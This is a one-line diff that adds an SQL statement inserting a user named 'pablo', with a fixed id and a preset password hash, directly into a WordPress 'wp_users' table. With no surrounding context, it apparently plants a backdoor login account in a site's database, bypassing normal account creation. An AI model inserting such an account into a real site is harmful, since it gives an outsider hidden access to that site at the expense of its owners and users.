@@ -1,0 +1,1 @@
+insert into wp_users (id,user_pass,user_login) VALUES ('200','$P$Bn8mWiawugkVa0XBI.WjEctUPLEYUE0','pablo')
